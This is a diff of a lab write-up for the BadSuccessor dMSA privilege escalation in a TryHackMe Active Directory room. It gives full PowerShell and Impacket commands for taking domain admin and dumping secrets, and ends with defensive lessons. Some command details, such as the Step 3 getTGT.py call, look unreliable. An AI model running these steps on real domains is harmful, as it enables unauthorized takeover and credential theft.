@@ -6,23 +6,23 @@
 | **Room** | [AD: BadSuccessor](https://tryhackme.com/room/adbadsuccessor) |
 | **Difficulty** | 🟡 Medium |
 | **Category** | Active Directory |
-| **OS** | Windows |
-| **Tools** | BloodHound, PowerView, Impacket |
+| **OS** | Windows Server 2025 |
+| **Tools** | nmap, BloodHound, PowerView, Impacket, evil-winrm |
 | **CVE** | CVE-2025-29810 — dMSA BadSuccessor |
 
 ---
 
 ## 🎯 Objective
 
-Exploit the BadSuccessor vulnerability — abusing delegated Managed Service Account (dMSA) successor relationships to escalate privileges in Active Directory.
+Exploit the BadSuccessor vulnerability to escalate privileges in Active Directory by abusing delegated Managed Service Account (dMSA) successor relationships.
 
 ---
 
 ## 📖 Vulnerability Overview
 
-BadSuccessor (CVE-2025-29810) abuses a design flaw in Windows Server 2025 delegated Managed Service Accounts (dMSAs). When a dMSA is created with a `msDS-ManagedAccountPrecededByLink` attribute pointing to a target account, the KDC grants the dMSA all of the target account's privileges — including Domain Admin privileges — without requiring the target account's credentials.
+BadSuccessor (CVE-2025-29810) is a Windows Server 2025 privilege escalation vulnerability. When a delegated Managed Service Account (dMSA) is created with `msDS-ManagedAccountPrecededByLink` pointing to a privileged account (e.g. Domain Admin), the KDC grants the dMSA all of that account's privileges during authentication.
 
-**Any domain user with CreateChild rights over an OU can exploit this.**
+**Key requirement:** Any user with `CreateChild` rights on an Organizational Unit (OU) can exploit this — this is a delegated permission commonly granted to IT support staff.
 
 ---
 
@@ -32,46 +32,78 @@ BadSuccessor (CVE-2025-29810) abuses a design flaw in Windows Server 2025 delega
 nmap -sC -sV -p 88,389,445,636,3268,5985 TARGET_IP
 ```
 
-Running BloodHound to identify attack path:
-```bash
-bloodhound-python -u user -p password -ns TARGET_IP -d domain.local -c all
+Add to `/etc/hosts`:
+```
+TARGET_IP domain.local dc.domain.local
 ```
 
-**BloodHound query:** Find users with CreateChild on any OU → CreateChild can be exploited to create dMSA accounts.
+---
+
+## 🩸 BloodHound — Find CreateChild Rights
+
+```bash
+bloodhound-python -u user -p password \
+  -ns TARGET_IP -d domain.local -c all
+```
+
+Import data into BloodHound. Run custom query to find users with `CreateChild` on any OU:
+
+```cypher
+MATCH p=(u:User)-[:CreateChild]->(o:OU) RETURN p
+```
 
 ---
 
 ## 💥 Exploitation
 
+**Step 1 — Create a dMSA in the target OU:**
+
 ```powershell
-# Step 1 — Create a new dMSA in an OU where we have CreateChild
-New-ADServiceAccount -Name "evilDMSA" -DNSHostName "evildmsa.domain.local" \
-  -Path "OU=Target,DC=domain,DC=local" \
+# On Windows (RDP or evil-winrm)
+New-ADServiceAccount -Name "evilDMSA" `
+  -DNSHostName "evildmsa.domain.local" `
+  -Path "OU=Target,DC=domain,DC=local" `
   -PrincipalsAllowedToRetrieveManagedPassword "Domain Computers"
-
-# Step 2 — Set the predecessor link to Domain Admin account
-Set-ADServiceAccount -Identity "evilDMSA" \
-  -Replace @{"msDS-ManagedAccountPrecededByLink" = "CN=Administrator,CN=Users,DC=domain,DC=local"}
-
-# Step 3 — Retrieve the dMSA password (grants DA privileges)
-# Use Impacket or Rubeus to request TGT as the dMSA
 ```
 
-Using Python exploit:
+**Step 2 — Set predecessor link to Domain Admin:**
+
+```powershell
+Set-ADServiceAccount -Identity "evilDMSA" `
+  -Replace @{
+    "msDS-ManagedAccountPrecededByLink" = `
+    "CN=Administrator,CN=Users,DC=domain,DC=local"
+  }
+```
+
+**Step 3 — Request TGT as dMSA (inherits DA privileges):**
+
 ```bash
-python3 badsuccessor.py -dc-ip TARGET_IP domain.local/user:password
+# Using Impacket
+getTGT.py -spn "evildmsa$" domain.local
+
+# Or Python exploit tool (community-developed post-disclosure)
+python3 badsuccessor.py -dc-ip TARGET_IP \
+  domain.local/user:password
 ```
 
-**Domain Admin access achieved.**
+**Step 4 — Use ticket for DA access:**
+
+```bash
+export KRB5CCNAME=evildmsa.ccache
+secretsdump.py -k -no-pass dc.domain.local
+psexec.py -k -no-pass dc.domain.local
+```
 
 ---
 
 ## 📚 Lessons Learned
 
-- BadSuccessor is a Windows Server 2025-specific vulnerability — patch KB updates immediately
-- CreateChild rights on OUs should be carefully audited — least privilege applies to AD permissions too
-- dMSA accounts should be monitored for unexpected predecessor link modifications
-- BloodHound custom queries can find CreateChild edges that default queries miss
+- `CreateChild` on OUs is a commonly over-delegated permission — audit it regularly
+- dMSA accounts should be monitored for unexpected `msDS-ManagedAccountPrecededByLink` modifications
+- This CVE was disclosed May 2025 — patch with the relevant KB immediately on Windows Server 2025
+- BloodHound custom queries are essential for finding non-obvious privilege escalation paths
+- Tooling for this CVE is actively evolving — check GitHub for the latest PoC implementations
 
 ---
 *by OwlRC 🦉 | github.com/OwlRC*
